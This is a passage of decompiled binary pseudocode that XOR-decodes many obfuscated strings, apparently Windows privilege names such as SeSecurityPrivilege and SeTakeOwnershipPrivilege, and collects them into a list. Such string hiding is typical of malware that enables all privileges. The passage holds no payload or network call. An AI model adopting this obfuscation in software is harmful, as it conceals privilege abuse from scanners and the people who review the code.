var_1ch) ^ *(&var_c4h + var_1ch % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_254h._0_1_ = 0x1e;\n    var_254h._1_1_ = 0x53;\n    var_254h._2_1_ = 6;\n    var_254h._3_1_ = 0x2d;\n    var_250h = 0x16;\n    var_24fh = 0x20;\n    var_24eh = 0x3f;\n    var_24dh = 0x5f;\n    var_24ch = 0x21;\n    var_24bh = 0x31;\n    var_24ah = 0x25;\n    var_249h = 0x27;\n    var_248h = 0x24;\n    var_247h = 0x40;\n    var_246h = 0x3c;\n    var_245h = 0x24;\n    var_244h = 0x10;\n    var_243h = 0x32;\n    var_242h = 0x28;\n    var_241h = 0x36;\n    var_124h._0_1_ = 0x4d;\n    var_124h._1_1_ = 0x36;\n    var_124h._2_1_ = 0x55;\n    var_124h._3_1_ = 0x48;\n    var_120h = 0x75;\n    var_11fh = 0x55;\n    fcn.004012a0(0x14);\n    for (var_20h = 0; var_20h < 0x14; var_20h = var_20h + 1) {\n        fcn.00401280(var_20h, *(&var_254h + var_20h) ^ *(&var_124h + var_20h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_378h._0_1_ = 0xb;\n    var_378h._1_1_ = 0x3f;\n    var_378h._2_1_ = 0x2e;\n    var_378h._3_1_ = 0x52;\n    var_374h = 4;\n    var_373h = 0x3d;\n    var_372h = 0x15;\n    var_371h = 0xd;\n    var_370h = 0x5d;\n    var_36fh = 10;\n    var_36eh = 0x2a;\n    var_36dh = 0x29;\n    var_36ch = 0x12;\n    var_36bh = 0x5a;\n    var_36ah = 0x1f;\n    var_369h = 8;\n    var_368h = 0x28;\n    var_367h = 0x13;\n    var_366h = 0x45;\n    var_365h = 6;\n    var_364h = 0x34;\n    var_363h = 0x3f;\n    var_362h = 0x1d;\n    var_361h = 0x56;\n    var_360h = 0x6f;\n    var_bch._0_1_ = 0x58;\n    var_bch._1_1_ = 0x5a;\n    var_bch._2_1_ = 0x7a;\n    var_bch._3_1_ = 0x33;\n    var_b8h = 0x6f;\n    fcn.004012a0(0x19);\n    for (var_24h = 0; var_24h < 0x19; var_24h = var_24h + 1) {\n        fcn.00401280(var_24h, *(&var_378h + var_24h) ^ *(&var_bch + var_24h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_2b0h[0] = 1;\n    var_2b0h[1] = 0x20;\n    var_2b0h[2] = 0x2d;\n    var_2b0h[3] = 0xb;\n    var_2ach = 0x14;\n    var_2abh = 0x36;\n    var_2aah = 1;\n    var_2a9h = 0x13;\n    var_2a8h = 0xd;\n    var_2a7h = 3;\n    var_2a6h = 0x37;\n    var_2a5h = 0x37;\n    var_2a4h = 0x31;\n    var_2a3h = 0x16;\n    var_2a2h = 0x1c;\n    var_2a1h = 0x24;\n    var_2a0h = 0x2c;\n    var_29fh = 0xd;\n    var_29eh = 1;\n    var_29dh = 0x12;\n    var_29ch = 0x37;\n    var_29bh = 0x45;\n    var_ach._0_1_ = 0x52;\n    var_ach._1_1_ = 0x45;\n    var_ach._2_1_ = 0x61;\n    var_ach._3_1_ = 100;\n    var_a8h = 0x75;\n    fcn.004012a0(0x16);\n    for (var_28h = 0; var_28h < 0x16; var_28h = var_28h + 1) {\n        fcn.00401280(var_28h, var_2b0h[var_28h] ^ *(&var_ach + var_28h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_35ch._0_1_ = 0x21;\n    var_35ch._1_1_ = 0x55;\n    var_35ch._2_1_ = 0x3f;\n    var_35ch._3_1_ = 0xb;\n    var_358h = 0x23;\n    var_357h = 0x16;\n    var_356h = 0x17;\n    var_355h = 0x5d;\n    var_354h = 0x3c;\n    var_353h = 0;\n    var_352h = 0x3f;\n    var_351h = 4;\n    var_350h = 0x1b;\n    var_34fh = 0x5c;\n    var_34eh = 9;\n    var_34dh = 0x22;\n    var_34ch = 0x22;\n    var_34bh = 0xb;\n    var_34ah = 4;\n    var_349h = 0x59;\n    var_348h = 0;\n    var_347h = 0x17;\n    var_346h = 0x37;\n    var_345h = 7;\n    var_344h = 0x72;\n    var_12ch._0_1_ = 0x72;\n    var_12ch._1_1_ = 0x30;\n    var_12ch._2_1_ = 0x6c;\n    var_12ch._3_1_ = 0x72;\n    var_128h = 0x50;\n    var_127h = 0x62;\n    fcn.004012a0(0x19);\n    for (var_2ch = 0; var_2ch < 0x19; var_2ch = var_2ch + 1) {\n        fcn.00401280(var_2ch, *(&var_35ch + var_2ch) ^ *(&var_12ch + var_2ch % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_298h[0] = 10;\n    var_298h[1] = 0x17;\n    var_298h[2] = 100;\n    var_298h[3] = 0x16;\n    var_294h = 3;\n    var_293h = 0x2d;\n    var_292h = 0x17;\n    var_291h = 0x5a;\n    var_290h = 0x1b;\n    var_28fh = 0x19;\n    var_28eh = 0x34;\n    var_28dh = 0x17;\n    var_28ch = 0x67;\n    var_28bh = 0x1d;\n    var_28ah = 0x19;\n    var_289h = 0x2f;\n    var_288h = 0x1b;\n    var_287h = 0x5b;\n    var_286h = 10;\n    var_285h = 0x17;\n    var_284h = 0x3c;\n    var_283h = 0x72;\n    var_a4h._0_1_ = 0x59;\n    var_a4h._1_1_ = 0x72;\n    var_a4h._2_1_ = 0x37;\n    var_a4h._3_1_ = 0x6f;\n    var_a0h = 0x70;\n    fcn.004012a0(0x16);\n    for (var_30h = 0; var_30h < 0x16; var_30h = var_30h + 1) {\n        fcn.00401280(var_30h, var_298h[var_30h] ^ *(&var_a4h + var_30h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_4fch._0_1_ = 0x39;\n    var_4fch._1_1_ = 0x26;\n    var_4fch._2_1_ = 0x33;\n    var_4fch._3_1_ = 0x1d;\n    var_4f8h = 0xb;\n    var_4f7h = 0xc;\n    var_4f6h = 0x2a;\n    var_4f5h = 0xf;\n    var_4f4h = 10;\n    var_4f3h = 0x37;\n    var_4f2h = 3;\n    var_4f1h = 0x2d;\n    var_4f0h = 4;\n    var_4efh = 3;\n    var_4eeh = 1;\n    var_4edh = 0x3a;\n    var_4ech = 0x31;\n    var_4ebh = 0xc;\n    var_4eah = 0xc;\n    var_4e9h = 1;\n    var_4e8h = 0x19;\n    var_4e7h = 0x30;\n    var_4e6h = 0x33;\n    var_4e5h = 0x1d;\n    var_4e4h = 0xd;\n    var_4e3h = 0x1c;\n    var_4e2h = 0x2a;\n    var_4e1h = 0xf;\n    var_4e0h = 10;\n    var_4dfh = 3;\n    var_4deh = 0xf;\n    var_4ddh = 0x43;\n    var_9ch._0_1_ = 0x6a;\n    var_9ch._1_1_ = 0x43;\n    var_9ch._2_1_ = 99;\n    var_9ch._3_1_ = 0x6f;\n    var_98h = 100;\n    fcn.004012a0(0x20);\n    for (var_34h = 0; var_34h < 0x20; var_34h = var_34h + 1) {\n        fcn.00401280(var_34h, *(&var_4fch + var_34h) ^ *(&var_9ch + var_34h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_51ch._0_1_ = 0x11;\n    var_51ch._1_1_ = 0x11;\n    var_51ch._2_1_ = 7;\n    var_51ch._3_1_ = 0x39;\n    var_518h = 7;\n    var_517h = 0x14;\n    var_516h = 0x27;\n    var_515h = 0x15;\n    var_514h = 0x3d;\n    var_513h = 0x32;\n    var_512h = 0x26;\n    var_511h = 7;\n    var_510h = 0x31;\n    var_50fh = 0x11;\n    var_50eh = 0x1e;\n    var_50dh = 0x25;\n    var_50ch = 0xd;\n    var_50bh = 9;\n    var_50ah = 0x30;\n    var_509h = 0x1d;\n    var_508h = 0x3a;\n    var_507h = 0x2e;\n    var_506h = 0x34;\n    var_505h = 0x14;\n    var_504h = 0x2b;\n    var_503h = 2;\n    var_502h = 0x27;\n    var_501h = 0x3b;\n    var_500h = 1;\n    var_4ffh = 1;\n    var_4feh = 0x27;\n    var_4fdh = 0x74;\n    var_134h._0_1_ = 0x42;\n    var_134h._1_1_ = 0x74;\n    var_134h._2_1_ = 0x4e;\n    var_134h._3_1_ = 0x57;\n    var_130h = 100;\n    var_12fh = 0x66;\n    fcn.004012a0(0x20);\n    for (var_38h = 0; var_38h < 0x20; var_38h = var_38h + 1) {\n        fcn.00401280(var_38h, *(&var_51ch + var_38h) ^ *(&var_134h + var_38h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_3cch[0] = 0x34;\n    var_3cch[1] = 0x56;\n    var_3cch[2] = 0x33;\n    var_3cch[3] = 0x47;\n    var_3c8h = 0x30;\n    var_3c7h = 0x34;\n    var_3c6h = 0x13;\n    var_3c5h = 0x56;\n    var_3c4h = 0x20;\n    var_3c3h = 0x54;\n    var_3c2h = 0x32;\n    var_3c1h = 0x30;\n    var_3c0h = 1;\n    var_3bfh = 0x5a;\n    var_3beh = 0x1c;\n    var_3bdh = 0x50;\n    var_3bch = 5;\n    var_3bbh = 0x27;\n    var_3bah = 0xe;\n    var_3b9h = 0x45;\n    var_3b8h = 0x19;\n    var_3b7h = 0x59;\n    var_3b6h = 0x30;\n    var_3b5h = 0x32;\n    var_3b4h = 2;\n    var_3b3h = 0x33;\n    var_13ch._0_1_ = 0x67;\n    var_13ch._1_1_ = 0x33;\n    var_13ch._2_1_ = 0x70;\n    var_13ch._3_1_ = 0x35;\n    var_138h = 0x55;\n    var_137h = 0x55;\n    fcn.004012a0(0x1a);\n    for (var_3ch = 0; var_3ch < 0x1a; var_3ch = var_3ch + 1) {\n        fcn.00401280(var_3ch, var_3cch[var_3ch] ^ *(&var_13ch + var_3ch % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_404h._0_1_ = 0x30;\n    var_404h._1_1_ = 0x23;\n    var_404h._2_1_ = 0x12;\n    var_404h._3_1_ = 0x35;\n    var_400h = 0xe;\n    var_3ffh = 10;\n    var_3feh = 0x17;\n    var_3fdh = 0x23;\n    var_3fch = 1;\n    var_3fbh = 0x22;\n    var_3fah = 0x19;\n    var_3f9h = 6;\n    var_3f8h = 2;\n    var_3f7h = 0x28;\n    var_3f6h = 0x34;\n    var_3f5h = 0x29;\n    var_3f4h = 0x1f;\n    var_3f3h = 0x3b;\n    var_3f2h = 0x11;\n    var_3f1h = 0x2f;\n    var_3f0h = 0x27;\n    var_3efh = 0x2e;\n    var_3eeh = 7;\n    var_3edh = 0xe;\n    var_3ech = 4;\n    var_3ebh = 0x23;\n    var_3eah = 0x51;\n    var_144h._0_1_ = 99;\n    var_144h._1_1_ = 0x46;\n    var_144h._2_1_ = 0x51;\n    var_144h._3_1_ = 0x47;\n    var_140h = 0x6b;\n    var_13fh = 0x6b;\n    fcn.004012a0(0x1b);\n    for (var_40h = 0; var_40h < 0x1b; var_40h = var_40h + 1) {\n        fcn.00401280(var_40h, *(&var_404h + var_40h) ^ *(&var_144h + var_40h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_204h._0_1_ = 0;\n    var_204h._1_1_ = 0x51;\n    var_204h._2_1_ = 0x2d;\n    var_204h._3_1_ = 0x24;\n    var_200h = 0x28;\n    var_1ffh = 0x38;\n    var_1feh = 0x26;\n    var_1fdh = 0x44;\n    var_1fch = 0x3f;\n    var_1fbh = 0x37;\n    var_1fah = 0x22;\n    var_1f9h = 0x25;\n    var_1f8h = 0x3a;\n    var_1f7h = 0x58;\n    var_1f6h = 10;\n    var_1f5h = 0x22;\n    var_1f4h = 0x2e;\n    var_1f3h = 0x53;\n    var_14ch._0_1_ = 0x53;\n    var_14ch._1_1_ = 0x34;\n    var_14ch._2_1_ = 0x6f;\n    var_14ch._3_1_ = 0x45;\n    var_148h = 0x4b;\n    var_147h = 0x53;\n    fcn.004012a0(0x12);\n    for (var_44h = 0; var_44h < 0x12; var_44h = var_44h + 1) {\n        fcn.00401280(var_44h, *(&var_204h + var_44h) ^ *(&var_14ch + var_44h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_22ch._0_1_ = 0x67;\n    var_22ch._1_1_ = 9;\n    var_22ch._2_1_ = 0x19;\n    var_22ch._3_1_ = 0x1d;\n    var_228h = 0x2b;\n    var_227h = 6;\n    var_226h = 0x5b;\n    var_225h = 0x1e;\n    var_224h = 0x2e;\n    var_223h = 0x28;\n    var_222h = 0x2a;\n    var_221h = 0x1b;\n    var_220h = 0x42;\n    var_21fh = 5;\n    var_21eh = 0x27;\n    var_21dh = 0x1d;\n    var_21ch = 0x3f;\n    var_21bh = 0x17;\n    var_21ah = 0x34;\n    var_154h._0_1_ = 0x34;\n    var_154h._1_1_ = 0x6c;\n    var_154h._2_1_ = 0x4b;\n    var_154h._3_1_ = 0x78;\n    var_150h = 0x58;\n    var_14fh = 0x72;\n    fcn.004012a0(0x13);\n    for (var_48h = 0; var_48h < 0x13; var_48h = var_48h + 1) {\n        fcn.00401280(var_48h, *(&var_22ch + var_48h) ^ *(&var_154h + var_48h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_268h._0_1_ = 0x19;\n    var_268h._1_1_ = 0x17;\n    var_268h._2_1_ = 99;\n    var_268h._3_1_ = 0x5f;\n    var_264h = 0x1c;\n    var_263h = 0x3e;\n    var_262h = 0x16;\n    var_261h = 0x5f;\n    var_260h = 0x40;\n    var_25fh = 7;\n    var_25eh = 0x1a;\n    var_25dh = 0;\n    var_25ch = 0x59;\n    var_25bh = 0x41;\n    var_25ah = 0;\n    var_259h = 0x26;\n    var_258h = 0x17;\n    var_257h = 0x57;\n    var_256h = 0x52;\n    var_255h = 0x69;\n    var_94h._0_1_ = 0x4a;\n    var_94h._1_1_ = 0x72;\n    var_94h._2_1_ = 0x30;\n    var_94h._3_1_ = 0x37;\n    var_90h = 0x69;\n    fcn.004012a0(0x14);\n    for (var_4ch = 0; var_4ch < 0x14; var_4ch = var_4ch + 1) {\n        fcn.00401280(var_4ch, *(&var_268h + var_4ch) ^ *(&var_94h + var_4ch % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_1dch._0_1_ = 6;\n    var_1dch._1_1_ = 8;\n    var_1dch._2_1_ = 0x75;\n    var_1dch._3_1_ = 8;\n    var_1d8h = 0x29;\n    var_1d7h = 0x21;\n    var_1d6h = 0x32;\n    var_1d5h = 0x3d;\n    var_1d4h = 0x43;\n    var_1d3h = 4;\n    var_1d2h = 0x3d;\n    var_1d1h = 0x3d;\n    var_1d0h = 0x39;\n    var_1cfh = 8;\n    var_1ceh = 0x56;\n    var_1cdh = 8;\n    var_1cch = 0x4b;\n    var_15ch._0_1_ = 0x55;\n    var_15ch._1_1_ = 0x6d;\n    var_15ch._2_1_ = 0x31;\n    var_15ch._3_1_ = 0x6d;\n    var_158h = 0x4b;\n    var_157h = 0x54;\n    fcn.004012a0(0x11);\n    for (var_50h = 0; var_50h < 0x11; var_50h = var_50h + 1) {\n        fcn.00401280(var_50h, *(&var_1dch + var_50h) ^ *(&var_15ch + var_50h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_1c8h._0_1_ = 0x2b;\n    var_1c8h._1_1_ = 0x14;\n    var_1c8h._2_1_ = 0x79;\n    var_1c8h._3_1_ = 0x12;\n    var_1c4h = 0x3c;\n    var_1c3h = 0x3c;\n    var_1c2h = 0xc;\n    var_1c1h = 0x21;\n    var_1c0h = 0x4a;\n    var_1bfh = 0xe;\n    var_1beh = 0x2e;\n    var_1bdh = 0x3c;\n    var_1bch = 0x14;\n    var_1bbh = 0x14;\n    var_1bah = 0x5f;\n    var_1b9h = 2;\n    var_1b8h = 0x58;\n    var_164h._0_1_ = 0x78;\n    var_164h._1_1_ = 0x71;\n    var_164h._2_1_ = 0x38;\n    var_164h._3_1_ = 0x67;\n    var_160h = 0x58;\n    var_15fh = 0x55;\n    fcn.004012a0(0x11);\n    for (var_54h = 0; var_54h < 0x11; var_54h = var_54h + 1) {\n        fcn.00401280(var_54h, *(&var_1c8h + var_54h) ^ *(&var_164h + var_54h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_45ch[0] = 0x11;\n    var_45ch[1] = 0x37;\n    var_45ch[2] = 0x34;\n    var_45ch[3] = 0x3f;\n    var_458h = 0x1a;\n    var_457h = 0x20;\n    var_456h = 0x27;\n    var_455h = 0x3f;\n    var_454h = 0x22;\n    var_453h = 0x28;\n    var_452h = 0x1f;\n    var_451h = 0x3d;\n    var_450h = 0x30;\n    var_44fh = 0x3d;\n    var_44eh = 9;\n    var_44dh = 0x2b;\n    var_44ch = 0xc;\n    var_44bh = 0x3a;\n    var_44ah = 0x36;\n    var_449h = 2;\n    var_448h = 0x15;\n    var_447h = 0x2f;\n    var_446h = 0x1f;\n    var_445h = 0x3d;\n    var_444h = 0x2e;\n    var_443h = 0x37;\n    var_442h = 0;\n    var_441h = 0x23;\n    var_440h = 0x69;\n    var_16ch._0_1_ = 0x42;\n    var_16ch._1_1_ = 0x52;\n    var_16ch._2_1_ = 0x67;\n    var_16ch._3_1_ = 0x46;\n    var_168h = 0x69;\n    var_167h = 0x54;\n    fcn.004012a0(0x1d);\n    for (var_58h = 0; var_58h < 0x1d; var_58h = var_58h + 1) {\n        fcn.00401280(var_58h, var_45ch[var_58h] ^ *(&var_16ch + var_58h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_340h._0_1_ = 100;\n    var_340h._1_1_ = 0x54;\n    var_340h._2_1_ = 0x2d;\n    var_340h._3_1_ = 0x3f;\n    var_33ch = 0x29;\n    var_33bh = 0x59;\n    var_33ah = 0x56;\n    var_339h = 0xb;\n    var_338h = 0x19;\n    var_337h = 0x27;\n    var_336h = 0x43;\n    var_335h = 0x58;\n    var_334h = 8;\n    var_333h = 0x2e;\n    var_332h = 0x18;\n    var_331h = 0x45;\n    var_330h = 0x58;\n    var_32fh = 0x18;\n    var_32eh = 0x3e;\n    var_32dh = 0x24;\n    var_32ch = 0x52;\n    var_32bh = 0x56;\n    var_32ah = 0xb;\n    var_329h = 0x57;\n    var_fch[0] = 0x37;\n    var_fch[1] = 0x31;\n    var_fch[2] = 0x6e;\n    var_fch[3] = 0x57;\n    var_f8h = 0x48;\n    fcn.004012a0(0x18);\n    for (var_5ch = 0; var_5ch < 0x18; var_5ch = var_5ch + 1) {\n        fcn.00401280(var_5ch, *(&var_340h + var_5ch) ^ var_fch[var_5ch % 5]);\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_3b0h[0] = 0x1d;\n    var_3b0h[1] = 0x11;\n    var_3b0h[2] = 0x15;\n    var_3b0h[3] = 0x2b;\n    var_3ach = 0x18;\n    var_3abh = 0xc;\n    var_3aah = 0x3a;\n    var_3a9h = 0x11;\n    var_3a8h = 0x14;\n    var_3a7h = 0x26;\n    var_3a6h = 0;\n    var_3a5h = 0x17;\n    var_3a4h = 0x2a;\n    var_3a3h = 0x1b;\n    var_3a2h = 0x30;\n    var_3a1h = 0x20;\n    var_3a0h = 0x25;\n    var_39fh = 0x11;\n    var_39eh = 0x27;\n    var_39dh = 2;\n    var_39ch = 0x2e;\n    var_39bh = 0x22;\n    var_39ah = 0x10;\n    var_399h = 4;\n    var_398h = 0x2b;\n    var_397h = 0x74;\n    var_174h._0_1_ = 0x4e;\n    var_174h._1_1_ = 0x74;\n    var_174h._2_1_ = 0x47;\n    var_174h._3_1_ = 0x4e;\n    var_170h = 0x75;\n    var_16fh = 99;\n    fcn.004012a0(0x1a);\n    for (var_60h = 0; var_60h < 0x1a; var_60h = var_60h + 1) {\n        fcn.00401280(var_60h, var_3b0h[var_60h] ^ *(&var_174h + var_60h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_1f0h[0] = 0x3e;\n    var_1f0h[1] = 0x13;\n    var_1f0h[2] = 0x20;\n    var_1f0h[3] = 0x5a;\n    var_1ech = 0xb;\n    var_1ebh = 2;\n    var_1eah = 0x15;\n    var_1e9h = 0x1e;\n    var_1e8h = 100;\n    var_1e7h = 0x1d;\n    var_1e6h = 4;\n    var_1e5h = 0;\n    var_1e4h = 0x1c;\n    var_1e3h = 0x58;\n    var_1e2h = 10;\n    var_1e1h = 10;\n    var_1e0h = 0x13;\n    var_1dfh = 0x75;\n    var_f4h._0_1_ = 0x6d;\n    var_f4h._1_1_ = 0x76;\n    var_f4h._2_1_ = 0x75;\n    var_f4h._3_1_ = 0x34;\n    var_f0h = 0x6f;\n    fcn.004012a0(0x12);\n    for (var_64h = 0; var_64h < 0x12; var_64h = var_64h + 1) {\n        fcn.00401280(var_64h, var_1f0h[var_64h] ^ *(&var_f4h + var_64h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_280h[0] = 0x10;\n    var_280h[1] = 0x26;\n    var_280h[2] = 0x2a;\n    var_280h[3] = 0x33;\n    var_27ch = 0x37;\n    var_27bh = 0x20;\n    var_27ah = 2;\n    var_279h = 0x1e;\n    var_278h = 0x2f;\n    var_277h = 0x37;\n    var_276h = 0x37;\n    var_275h = 0x13;\n    var_274h = 0xb;\n    var_273h = 0x23;\n    var_272h = 0x2f;\n    var_271h = 0x2a;\n    var_270h = 0x2f;\n    var_26fh = 0x1c;\n    var_26eh = 0x2d;\n    var_26dh = 0x3c;\n    var_26ch = 0x43;\n    var_ech._0_1_ = 0x43;\n    var_ech._1_1_ = 0x43;\n    var_ech._2_1_ = 0x79;\n    var_ech._3_1_ = 0x4a;\n    var_e8h = 0x59;\n    fcn.004012a0(0x15);\n    for (var_68h = 0; var_68h < 0x15; var_68h = var_68h + 1) {\n        fcn.00401280(var_68h, var_280h[var_68h] ^ *(&var_ech + var_68h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_420h[0] = 0;\n    var_420h[1] = 0x28;\n    var_420h[2] = 0x36;\n    var_420h[3] = 2;\n    var_41ch = 0xc;\n    var_41bh = 0x13;\n    var_41ah = 0x3f;\n    var_419h = 0x28;\n    var_418h = 0x37;\n    var_417h = 9;\n    var_416h = 1;\n    var_415h = 0x14;\n    var_414h = 0x34;\n    var_413h = 0x2c;\n    var_412h = 7;\n    var_411h = 5;\n    var_410h = 2;\n    var_40fh = 0x1f;\n    var_40eh = 3;\n    var_40dh = 0x3f;\n    var_40ch = 0x1a;\n    var_40bh = 0x1a;\n    var_40ah = 4;\n    var_409h = 0x1d;\n    var_408h = 0x36;\n    var_407h = 0x2a;\n    var_406h = 0x16;\n    var_405h = 0x6c;\n    var_17ch._0_1_ = 0x53;\n    var_17ch._1_1_ = 0x4d;\n    var_17ch._2_1_ = 0x73;\n    var_17ch._3_1_ = 0x6c;\n    var_178h = 0x6d;\n    var_177h = 0x71;\n    fcn.004012a0(0x1c);\n    for (var_6ch = 0; var_6ch < 0x1c; var_6ch = var_6ch + 1) {\n        fcn.00401280(var_6ch, var_420h[var_6ch] ^ *(&var_17ch + var_6ch % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_328h[0] = 0x67;\n    var_328h[1] = 0xf;\n    var_328h[2] = 0x20;\n    var_328h[3] = 0x36;\n    var_324h = 0x5a;\n    var_323h = 0x25;\n    var_322h = 0x53;\n    var_321h = 0xf;\n    var_320h = 0x3b;\n    var_31fh = 0x38;\n    var_31eh = 0x58;\n    var_31dh = 0x31;\n    var_31ch = 0x59;\n    var_31bh = 0xf;\n    var_31ah = 0x3d;\n    var_319h = 0x25;\n    var_318h = 0x5d;\n    var_317h = 0x32;\n    var_316h = 0x5d;\n    var_315h = 6;\n    var_314h = 8;\n    var_313h = 0x30;\n    var_312h = 0x51;\n    var_311h = 0x44;\n    var_184h._0_1_ = 0x34;\n    var_184h._1_1_ = 0x6a;\n    var_184h._2_1_ = 0x6d;\n    var_184h._3_1_ = 0x57;\n    var_180h = 0x34;\n    var_17fh = 0x44;\n    fcn.004012a0(0x18);\n    for (var_70h = 0; var_70h < 0x18; var_70h = var_70h + 1) {\n        fcn.00401280(var_70h, var_328h[var_70h] ^ *(&var_184h + var_70h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_2e0h[0] = 0x65;\n    var_2e0h[1] = 0x15;\n    var_2e0h[2] = 7;\n    var_2e0h[3] = 0x34;\n    var_2dch = 8;\n    var_2dbh = 0x53;\n    var_2dah = 2;\n    var_2d9h = 0x3d;\n    var_2d8h = 0x36;\n    var_2d7h = 0x16;\n    var_2d6h = 0x57;\n    var_2d5h = 4;\n    var_2d4h = 0x2b;\n    var_2d3h = 9;\n    var_2d2h = 10;\n    var_2d1h = 0x5f;\n    var_2d0h = 6;\n    var_2cfh = 0x27;\n    var_2ceh = 0x35;\n    var_2cdh = 0x1d;\n    var_2cch = 0x51;\n    var_2cbh = 0x15;\n    var_2cah = 0x4e;\n    var_e4h._0_1_ = 0x36;\n    var_e4h._1_1_ = 0x70;\n    var_e4h._2_1_ = 0x4e;\n    var_e4h._3_1_ = 0x59;\n    var_e0h = 0x78;\n    fcn.004012a0(0x17);\n    for (var_74h = 0; var_74h < 0x17; var_74h = var_74h + 1) {\n        fcn.00401280(var_74h, var_2e0h[var_74h] ^ *(&var_e4h + var_74h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_310h[0] = 0x39;\n    var_310h[1] = 0x52;\n    var_310h[2] = 0xf;\n    var_310h[3] = 0x13;\n    var_30ch = 0x55;\n    var_30bh = 0xb;\n    var_30ah = 0x43;\n    var_309h = 0x29;\n    var_308h = 0x26;\n    var_307h = 0x5c;\n    var_306h = 5;\n    var_305h = 0x55;\n    var_304h = 0x2d;\n    var_303h = 0xd;\n    var_302h = 0x60;\n    var_301h = 0x18;\n    var_300h = 0x5e;\n    var_2ffh = 0x3a;\n    var_2feh = 8;\n    var_2fdh = 0x5c;\n    var_2fch = 0xf;\n    var_2fbh = 0x50;\n    var_2fah = 0x29;\n    var_2f9h = 0x61;\n    var_dch._0_1_ = 0x6a;\n    var_dch._1_1_ = 0x37;\n    var_dch._2_1_ = 0x4c;\n    var_dch._3_1_ = 0x61;\n    var_d8h = 0x30;\n    fcn.004012a0(0x18);\n    for (var_78h = 0; var_78h < 0x18; var_78h = var_78h + 1) {\n        fcn.00401280(var_78h, var_310h[var_78h] ^ *(&var_dch + var_78h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_4dch[0] = 0x29;\n    var_4dch[1] = 0x22;\n    var_4dch[2] = 0x1b;\n    var_4dch[3] = 0x27;\n    var_4d8h = 0x39;\n    var_4d7h = 2;\n    var_4d6h = 0xe;\n    var_4d5h = 0x22;\n    var_4d4h = 0x2b;\n    var_4d3h = 0x16;\n    var_4d2h = 0x3e;\n    var_4d1h = 0x14;\n    var_4d0h = 0x1e;\n    var_4cfh = 10;\n    var_4ceh = 0x2e;\n    var_4cdh = 0x3b;\n    var_4cch = 0xd;\n    var_4cbh = 0x12;\n    var_4cah = 0x19;\n    var_4c9h = 0x22;\n    var_4c8h = 0x3c;\n    var_4c7h = 0x26;\n    var_4c6h = 0x1c;\n    var_4c5h = 3;\n    var_4c4h = 0x13;\n    var_4c3h = 0x31;\n    var_4c2h = 0x26;\n    var_4c1h = 0x39;\n    var_4c0h = 0x29;\n    var_4bfh = 0x16;\n    var_4beh = 0x1f;\n    var_4bdh = 0x47;\n    var_18ch._0_1_ = 0x7a;\n    var_18ch._1_1_ = 0x47;\n    var_18ch._2_1_ = 0x4f;\n    var_18ch._3_1_ = 0x55;\n    var_188h = 0x4c;\n    var_187h = 0x71;\n    fcn.004012a0(0x20);\n    for (var_7ch = 0; var_7ch < 0x20; var_7ch = var_7ch + 1) {\n        fcn.00401280(var_7ch, var_4dch[var_7ch] ^ *(&var_18ch + var_7ch % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_218h[0] = 0x35;\n    var_218h[1] = 1;\n    var_218h[2] = 0x28;\n    var_218h[3] = 0x23;\n    var_214h = 0x25;\n    var_213h = 0x2e;\n    var_212h = 4;\n    var_211h = 1;\n    var_210h = 0x16;\n    var_20fh = 0x16;\n    var_20eh = 0x3b;\n    var_20dh = 0x26;\n    var_20ch = 0x10;\n    var_20bh = 0xd;\n    var_20ah = 0x16;\n    var_209h = 0x23;\n    var_208h = 0x2e;\n    var_207h = 0x2a;\n    var_206h = 0x66;\n    var_194h._0_1_ = 0x66;\n    var_194h._1_1_ = 100;\n    var_194h._2_1_ = 0x7a;\n    var_194h._3_1_ = 